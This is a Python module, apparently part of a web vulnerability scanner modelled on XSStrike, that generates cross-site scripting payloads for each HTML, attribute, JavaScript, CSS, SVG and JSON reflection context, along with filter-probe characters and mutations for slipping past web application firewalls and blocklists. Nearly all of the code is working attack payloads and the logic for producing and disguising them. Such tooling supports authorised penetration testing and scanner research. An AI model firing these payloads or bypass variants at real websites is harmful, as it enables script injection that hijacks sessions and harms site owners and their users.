"""Context-aware XSS payload generator — P1.

XSStrike workflow, GASH budget: context -> a few high-confidence payloads,
not millions of fuzz strings. Pure functions (no network) so unit tests
stay offline and deterministic.

- ``generate_for_context(context, marker)``: (payload, confidence, note)
  list, capped and deduped. Confidence 0-10 (higher = more likely).
- ``mutate_payload(payload)``: encoding/case/whitespace variants for the
  same breaker (WAF/filter bypass), capped.
- ``filter_probe_strings(marker)``: single-char probes used to learn which
  breaker characters survive (wired to network in P2; pure list here).
"""

from __future__ import annotations

from urllib.parse import quote

# Characters whose survival decides breakout per context. Sent one by one
# (P2) to learn the filter before generating the real payloads.
FILTER_PROBE_CHARS = ["<", ">", '"', "'", "`", "=", "/", "(", ")", ";",
                      "&", "|", "+", "$", "{", "}"]


def filter_probe_strings(marker: str) -> list[str]:
    """One probe per breaker char: ``<marker><char>``. Capped, deduped."""
    m = (marker or "").strip()
    if not m:
        return []
    return [f"{m}{c}" for c in FILTER_PROBE_CHARS]


def _fill_variants(tag_payload: str) -> list[str]:
    """Space <-> %0a/%0d/%09 + / separator variants (filter bypass)."""
    if " " not in tag_payload:
        return [tag_payload]
    return list(dict.fromkeys([
        tag_payload,
        tag_payload.replace(" ", "%0a", 1),
        tag_payload.replace(" ", "/", 1),
    ]))[:3]


def generate_for_context(context: str, marker: str) -> list[tuple[str, int, str]]:
    """Payloads for one reflection context. Max ~8, deduped, ordered by confidence."""
    m = (marker or "").strip()
    if not m:
        return []
    ctx = (context or "html-text").lower()
    out: list[tuple[str, int, str]] = []

    def add(payload: str, conf: int, note: str) -> None:
        out.append((payload, conf, note))

    if ctx == "html-text":
        add(f'{m}"><svg onload=alert(1)>', 9, "attr-breakout+svg")
        add(f'{m}<svg onload=alert(1)>', 7, "tag-injection")
        add(f'{m}</title><svg onload=alert(1)>', 7, "title-breakout")
        add(f'{m}<img src=x onerror=alert(1)>', 8, "img-event")
    elif ctx == "attr-double-quoted":
        add(f'{m}"autofocus/onfocus=alert(1)>', 8, "event-breakout")
        add(f'{m}"><svg onload=alert(1)>', 9, "attr-close+svg")
        add(f'{m}"onmouseover=alert(1)>', 7, "event-breakout")
    elif ctx == "attr-single-quoted":
        add(f"{m}'autofocus/onfocus=alert(1)>", 8, "event-breakout")
        add(f"{m}'><svg onload=alert(1)>", 9, "attr-close+svg")
        add(f"{m}'onmouseover=alert(1)>", 7, "event-breakout")
    elif ctx == "attr-unquoted":
        add(f"{m} autofocus/onfocus=alert(1)>", 8, "event-injection")
        add(f"{m}><svg onload=alert(1)>", 7, "tag-breakout")
    elif ctx == "event-handler":
        add(f"{m});alert(1);//", 7, "js-call-breakout")
        add(f"{m}'+alert(1)+'", 6, "string-concat")
    elif ctx == "url-attr":
        add(f"{m}javascript:alert(1)", 6, "js-url")
        add(f'{m}"javascript:alert(1)', 5, "js-url-breakout")
        add("java%09script:" + f"{m},alert(1)", 4, "js-url-ws-bypass")
    elif ctx == "js-string-single":
        add(f"{m}';alert(1);//", 8, "string-breakout")
        add(f"{m}'-alert(1)-'", 6, "string-concat")
    elif ctx == "js-string-double":
        add(f'{m}";alert(1);//', 8, "string-breakout")
        add(f'{m}"-alert(1)-"', 6, "string-concat")
    elif ctx == "js-template-literal":
        add(f"{m}`;alert(1);//", 7, "template-breakout")
        add(f"{m}${{alert(1)}}", 6, "template-expr")
    elif ctx == "js-expression":
        add(f"{m};alert(1)//", 7, "expr-chain")
        add(f"{m}+(alert(1))+", 5, "expr-concat")
    elif ctx in ("js-template-expression",):
        add(f"{m}}};alert(1);//", 6, "template-expr-breakout")
    elif ctx == "html-comment":
        add(f"{m}--><svg onload=alert(1)>", 8, "comment-breakout")
    elif ctx == "style-css":
        add(f"{m}</style><svg onload=alert(1)>", 7, "style-breakout")
    elif ctx in ("svg-text", "svg-attr-double-quoted", "svg-attr-single-quoted",
                 "svg-attr-unquoted", "svg-attr-double", "svg-attr"):
        add(f'{m}"><svg onload=alert(1)>', 8, "svg-breakout")
        add(f"{m} onload=alert(1)>", 7, "svg-event")
    elif ctx == "json-string":
        add(f'{m}"-alert(1)-"', 5, "json-string-concat")
        add(f"{m}</script><svg onload=alert(1)>", 6, "script-breakout")
    else:  # unknown/fallback -> html-text set
        add(f'{m}"><svg onload=alert(1)>', 8, "attr-breakout+svg")
        add(f'{m}<svg onload=alert(1)>', 6, "tag-injection")

    # expand whitespace fillings for tag payloads (bounded)
    expanded: list[tuple[str, int, str]] = []
    for payload, conf, note in out:
        if " " in payload and "<" in payload:
            for v in _fill_variants(payload):
                expanded.append((v, conf if v == payload else max(3, conf - 1),
                                 note + ("+ws" if v != payload else "")))
        else:
            expanded.append((payload, conf, note))
        if len(expanded) >= 10:
            break
    # dedupe by payload, keep first (highest confidence), sort desc
    seen: dict[str, tuple[str, int, str]] = {}
    for item in expanded:
        seen.setdefault(item[0], item)
    ranked = sorted(seen.values(), key=lambda t: -t[1])
    return ranked[:8]


def mutate_payload(payload: str) -> list[str]:
    """Same breaker, different wrappers: raw + URL-encode + case + WS.

    Capped at 4, deduped. Deterministic (no randomness -> stable tests).
    """
    if not payload:
        return []
    variants = [payload]
    enc = quote(payload, safe="")
    if enc != payload:
        variants.append(enc)
    # case mutation on the first tag keyword (bypasses naive blocklists)
    low = payload.lower()
    for kw in ("<svg", "<img", "onload", "onfocus", "onmouseover",
               "javascript", "alert"):
        if kw in low:
            i = low.find(kw)
            mutated = payload[:i] + payload[i:i + len(kw)].swapcase() \
                + payload[i + len(kw):]
            if mutated != payload:
                variants.append(mutated)
            break
    if " " in payload:
        ws = payload.replace(" ", "%0d", 1)
        if ws not in variants:
            variants.append(ws)
    return list(dict.fromkeys(variants))[:4]
